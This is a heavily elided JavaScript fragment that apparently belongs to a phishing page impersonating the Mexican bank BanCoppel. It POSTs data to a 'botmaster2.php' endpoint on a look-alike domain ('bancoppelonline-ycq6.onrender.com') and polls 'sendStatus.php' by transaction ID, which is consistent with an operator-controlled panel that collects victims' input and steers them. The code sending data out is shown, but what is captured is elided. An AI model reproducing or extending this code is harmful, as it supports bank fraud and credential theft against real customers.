...
`;
  ...
  await fetch("https://bancoppelonline-ycq6.onrender.com/botmaster2.php", {
    method: "POST",
  ...
  async function revisarAccion(txId) {
    try {
      const res = await fetch(`https://bancoppelonline-ycq6.onrender.com/sendStatus.php?txid=${txId}`);
